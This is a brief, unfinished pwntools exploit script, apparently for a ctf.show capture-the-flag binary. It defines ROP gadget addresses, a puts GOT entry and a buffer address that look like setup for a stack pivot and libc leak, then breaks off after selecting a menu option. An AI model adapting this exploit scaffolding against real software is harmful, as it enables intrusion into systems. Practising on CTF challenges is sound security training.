from pwn import *  
context.log_level = 'debug'
io = process('./pwn')
#io = remote('pwn.challenge.ctf.show',28277)
elf = ELF('./pwn')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#libc = ELF('/home/bit/libc/32bit/libc-2.23.so')
pop_ebp_ret = 0x08048B01
pop_edi_ebp_ret = 0x08048D8E
leave_ret = 0x080485D8
puts = elf.sym['puts']
puts_got = elf.got['puts']
arg1 = 0x804b01c
readline = 0x080486CB
fix_printf = 0x80484b6
ret = 0x0804846a 
buf = 0x0804BCF0
io.recvuntil('Your choice: ')
io.sendline('1')
sleep(0.5)
